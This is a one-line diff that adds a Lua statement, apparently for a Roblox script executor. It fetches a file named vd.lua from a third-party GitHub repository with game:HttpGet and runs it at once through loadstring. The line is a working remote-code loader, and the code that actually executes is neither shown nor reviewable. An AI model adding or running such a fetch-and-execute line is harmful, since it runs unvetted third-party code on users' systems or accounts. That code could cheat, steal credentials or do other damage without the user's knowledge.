@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/skidma/solarae/refs/heads/main/vd.lua"))()
